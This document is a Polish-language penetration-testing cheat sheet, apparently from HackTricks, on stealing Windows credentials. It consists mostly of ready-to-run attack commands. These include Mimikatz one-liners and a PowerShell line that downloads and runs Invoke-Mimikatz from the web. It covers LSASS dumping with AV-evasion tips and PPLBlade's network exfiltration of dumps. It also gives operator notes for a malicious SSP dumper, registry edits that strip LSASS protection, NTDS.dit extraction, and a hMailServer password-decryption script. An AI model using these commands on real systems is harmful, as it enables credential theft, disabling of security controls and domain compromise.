# Kradzież poświadczeń Windows

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Znajdź inne rzeczy, które Mimikatz może zrobić na** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Dowiedz się o możliwych zabezpieczeniach poświadczeń tutaj.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatz wyodrębnienie niektórych poświadczeń.**

## Credentials z Meterpreter

Użyj [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **który** stworzyłem, aby **wyszukać passwords i hashes** w systemie ofiary.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Omijanie AV

### Procdump + Mimikatz

Ponieważ **Procdump z** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem Microsoftu**, nie jest wykrywany przez Defender.\
Możesz użyć tego narzędzia, aby **dump the lsass process**, **download the dump** i **extract** **the credentials locally** z tego zrzutu.

Możesz także użyć [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ten proces jest wykonywany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Niektóre **AV** mogą **uznać** użycie **procdump.exe to dump lsass.exe** za **złośliwe**, ponieważ **wykrywają** ciąg znaków **"procdump.exe" and "lsass.exe"**. Dlatego jest bardziej **trudne do wykrycia**, jeśli **poda się** jako **argument** **PID** lsass.exe do procdump **zamiast** **nazwa lsass.exe**.

### Zrzucanie lsass przy użyciu **comsvcs.dll**

Biblioteka DLL o nazwie **comsvcs.dll** znajdująca się w `C:\Windows\System32` odpowiada za **zrzucanie pamięci procesu** w razie awarii. Ta DLL zawiera **funkcję** nazwaną **`MiniDumpW`**, przeznaczoną do wywołania za pomocą `rundll32.exe`.\
Nie mają znaczenia pierwsze dwa argumenty, natomiast trzeci jest podzielony na trzy składniki. Identyfikator procesu do zrzutu stanowi pierwszy składnik, lokalizacja pliku zrzutu — drugi, a trzeci składnik to ściśle słowo **full**. Nie ma innych opcji.\
Po sparsowaniu tych trzech składników, DLL tworzy plik zrzutu i zapisuje do niego pamięć wskazanego procesu.\
Wykorzystanie **comsvcs.dll** jest możliwe do zrzutu procesu lsass, co eliminuje konieczność wysyłania i uruchamiania procdump. Metoda ta jest opisana szczegółowo na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Do wykonania używa się następującego polecenia:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Możesz zautomatyzować ten proces za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass with Task Manager**

1. Kliknij prawym przyciskiem myszy na Task Bar i wybierz Task Manager
2. Kliknij More details
3. Wyszukaj proces "Local Security Authority Process" na karcie Processes
4. Kliknij prawym przyciskiem myszy na proces "Local Security Authority Process" i kliknij "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) jest podpisanym przez Microsoft plikiem binarnym, będącym częścią pakietu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Zrzucanie lsass za pomocą PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) jest narzędziem typu Protected Process Dumper Tool, które wspiera obfuskację zrzutu pamięci i przesyłanie go na zdalne stacje robocze bez zapisywania na dysku.

**Kluczowe funkcjonalności**:

1. Omijanie ochrony PPL
2. Obfuskowanie plików zrzutu pamięci, aby ominąć mechanizmy wykrywania oparte na sygnaturach Defendera
3. Przesyłanie zrzutu pamięci przy użyciu metod RAW i SMB bez zapisywania go na dysku (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon ships a three-stage dumper dubbed **LalsDumper** that never calls `MiniDumpWriteDump`, so EDR hooks on that API never fire:

1. **Stage 1 loader (`lals.exe`)** – przeszukuje `fdp.dll` w poszukiwaniu placeholdera składającego się z 32 małych znaków `d`, nadpisuje go ścieżką bezwzględną do `rtu.txt`, zapisuje załatany DLL jako `nfdp.dll` i wywołuje `AddSecurityPackageA("nfdp","fdp")`. To zmusza **LSASS** do załadowania złośliwego DLL jako nowego Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – gdy LSASS załaduje `nfdp.dll`, DLL odczytuje `rtu.txt`, XORuje każdy bajt z `0x20` i mapuje zdekodowany blob do pamięci zanim przekaże wykonanie.
3. **Stage 3 dumper** – zmapowany payload implementuje na nowo logikę MiniDump, używając **direct syscalls** rozwiązywanych z zahaszowanych nazw API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedykowany export o nazwie `Tom` otwiera `%TEMP%\<pid>.ddt`, zapisuje do pliku skompresowany zrzut LSASS i zamyka uchwyt, aby exfiltration mogła nastąpić później.

Operator notes:

* Keep `lals.exe`, `fdp.dll`, `nfdp.dll`, and `rtu.txt` in the same directory. Stage 1 rewrites the hard-coded placeholder with the absolute path to `rtu.txt`, so splitting them breaks the chain.
* Registration happens by appending `nfdp` to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. You can seed that value yourself to make LSASS reload the SSP every boot.
* `%TEMP%\*.ddt` files are compressed dumps. Decompress locally, then feed them to Mimikatz/Volatility for credential extraction.
* Running `lals.exe` requires admin/SeTcb rights so `AddSecurityPackageA` succeeds; once the call returns, LSASS transparently loads the rogue SSP and executes Stage 2.
* Removing the DLL from disk does not evict it from LSASS. Either delete the registry entry and restart LSASS (reboot) or leave it for long-term persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Zrzut pliku NTDS.dit z docelowego kontrolera domeny (DC)
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Zrzut historii haseł z NTDS.dit na docelowym DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Wyświetl atrybut pwdLastSet dla każdego konta w NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Te pliki powinny być **zlokalizowane** w _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Jednak **nie można ich po prostu skopiować w zwykły sposób**, ponieważ są chronione.

### Z rejestru

Najłatwiejszym sposobem na pobranie kopii tych plików jest uzyskanie ich kopii z rejestru:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij the hashes** używając:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Możesz wykonać kopię chronionych plików przy użyciu tej usługi. Musisz być Administrator.

#### Korzystanie z vssadmin

Plik binarny vssadmin jest dostępny tylko w wersjach Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Możesz to samo zrobić z poziomu **Powershell**. Oto przykład **jak skopiować plik SAM** (używany dysk to "C:", a plik jest zapisywany w C:\users\Public), ale możesz to wykorzystać do kopiowania dowolnego chronionego pliku:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kod z książki: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Na koniec możesz także użyć [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) do skopiowania SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Poświadczenia Active Directory - NTDS.dit**

Plik **NTDS.dit** jest uważany za serce **Active Directory**, zawierając kluczowe dane o obiektach użytkowników, grupach i ich członkostwach. To tam przechowywane są **password hashes** użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się pod adresem **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych utrzymywane są trzy główne tabele:

- **Data Table**: Ta tabela przechowuje szczegóły dotyczące obiektów takich jak użytkownicy i grupy.
- **Link Table**: Śledzi powiązania, takie jak członkostwa w grupach.
- **SD Table**: Tutaj przechowywane są **Security descriptors** dla każdego obiektu, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a jest on wykorzystywany przez _lsass.exe_. W związku z tym **część** pliku **NTDS.dit** może znajdować się **wewnątrz pamięci `lsass`** (możesz znaleźć najnowsze odczytane dane prawdopodobnie ze względu na poprawę wydajności przez użycie **cache**).

#### Odszyfrowywanie hashów w NTDS.dit

Hash jest szyfrowany 3 razy:

1. Odszyfruj Password Encryption Key (**PEK**) przy użyciu **BOOTKEY** i **RC4**.
2. Odszyfruj następnie **hash** używając **PEK** i **RC4**.
3. Odszyfruj **hash** używając **DES**.

**PEK** ma taką samą wartość na każdym kontrolerze domeny, ale jest zaszyfrowany wewnątrz pliku **NTDS.dit** przy użyciu **BOOTKEY** z pliku **SYSTEM** kontrolera domeny (różni się między kontrolerami domeny). Z tego powodu, aby uzyskać poświadczenia z pliku **NTDS.dit** potrzebujesz plików **NTDS.dit** i **SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiowanie NTDS.dit za pomocą Ntdsutil

Dostępne od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Możesz także użyć sztuczki [**volume shadow copy**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że będziesz także potrzebować kopii pliku **SYSTEM** (ponownie: [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **Wyodrębnianie hashes z NTDS.dit**

Po **uzyskaniu** plików **NTDS.dit** i **SYSTEM** możesz użyć narzędzi takich jak _secretsdump.py_, aby **wyodrębnić hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Możesz je również **wyodrębnić automatycznie** przy użyciu prawidłowego domain admin user:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Dla **dużych plików NTDS.dit** zaleca się ich wyodrębnienie przy użyciu [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Można również użyć **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy danych SQLite**

Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębnione są nie tylko secrets, ale także całe obiekty i ich atrybuty, co umożliwia dalsze pozyskiwanie informacji, gdy surowy plik NTDS.dit został już pobrany.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive jest opcjonalny, ale pozwala na odszyfrowanie sekretów (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Oprócz innych informacji wyodrębniane są następujące dane: konta użytkowników i maszyn wraz z ich hashes, flagi UAC, znaczniki czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i rekurencyjne członkostwa, drzewo jednostek organizacyjnych i członkostwa, trusted domains wraz z trusts type, direction and attributes...

## Lazagne

Pobierz binarkę z [here](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego pliku binarnego, aby wyodrębnić credentials z różnych programów.
```
lazagne.exe all
```
## Inne narzędzia do ekstrakcji poświadczeń z SAM i LSASS

### Windows credentials Editor (WCE)

To narzędzie może być użyte do wyodrębniania poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Wyodrębnia poświadczenia z pliku SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Wyodrębnij poświadczenia z pliku SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pobierz go z:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i po prostu **uruchom** go, a hasła zostaną wyekstrahowane.

## Wydobywanie nieaktywnych sesji RDP i osłabianie kontroli bezpieczeństwa

Ink Dragon’s FinalDraft RAT zawiera tasker `DumpRDPHistory`, którego techniki są przydatne dla każdego red-teamera:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – przeanalizuj każdy hive użytkownika pod `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Każdy podklucz przechowuje nazwę serwera, `UsernameHint` i znacznik czasu ostatniego zapisu. Możesz odtworzyć logikę FinalDraft za pomocą PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – przeszukaj dziennik `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pod kątem Event ID **21** (pomyślne logowanie) i **25** (rozłączenie), aby odwzorować, kto administrował maszyną:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Gdy już wiesz, który Domain Admin regularnie się łączy, zrzutuj LSASS (za pomocą LalsDumper/Mimikatz) gdy jego **rozłączona** sesja nadal istnieje. CredSSP + NTLM fallback pozostawia ich verifier i tokeny w LSASS, które można następnie odtworzyć przez SMB/WinRM, aby zdobyć `NTDS.dit` lub ustanowić trwałość na kontrolerach domeny.

### Obniżanie zabezpieczeń rejestru celowane przez FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Ustawienie `DisableRestrictedAdmin=1` wymusza pełne credential/ticket reuse podczas RDP, umożliwiając pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` wyłącza UAC token filtering, więc local admins otrzymują unrestricted tokens przez sieć.
* `DSRMAdminLogonBehavior=2` pozwala administratorowi DSRM logować się, gdy DC jest online, dając atakującym kolejne wbudowane konto o wysokich uprawnieniach.
* `RunAsPPL=0` usuwa LSASS PPL protections, ułatwiając dostęp do pamięci dla dumpers takich jak LalsDumper.

## Poświadczenia bazy danych hMailServer (po kompromitacji)

hMailServer przechowuje hasło DB w `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` pod `[Database] Password=`. Wartość jest zaszyfrowana Blowfish przy użyciu statycznego klucza `THIS_KEY_IS_NOT_SECRET` oraz z zamianą kolejności bajtów w 4-bajtowych słowach. Użyj ciągu szesnastkowego z INI za pomocą poniższego fragmentu Pythona:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Z hasłem w postaci jawnego tekstu skopiuj bazę danych SQL CE, aby uniknąć blokad plików, załaduj 32-bit provider i — w razie potrzeby — wykonaj upgrade przed pobraniem hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
The `accountpassword` column uses the hMailServer hash format (hashcat mode `1421`). Cracking these values can provide reusable credentials for WinRM/SSH pivots.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Some tooling captures **jawne hasła logowania** by intercepting the LSA logon callback `LsaApLogonUserEx2`. The idea is to hook or wrap the authentication package callback so credentials are captured **podczas logowania** (before hashing), then written to disk or returned to the operator. This is commonly implemented as a helper that injects into or registers with LSA, and then records each successful interactive/network logon event with the username, domain and password.

Operational notes:
- Requires local admin/SYSTEM to load the helper in the authentication path.
- Captured credentials appear only when a logon occurs (interactive, RDP, service, or network logon depending on the hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) stores saved connection information in a per-user `sqlstudio.bin` file. Dedicated dumpers can parse the file and recover saved SQL credentials. In shells that only return command output, the file is often exfiltrated by encoding it as Base64 and printing it to stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Po stronie operatora przebuduj plik i uruchom dumper lokalnie, aby odzyskać poświadczenia:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Źródła

- [Unit 42 – Dochodzenie w sprawie lat niezauważonych operacji wymierzonych w sektory o wysokiej wartości](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: ujawnianie sieci przekaźników i wewnętrznego działania skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
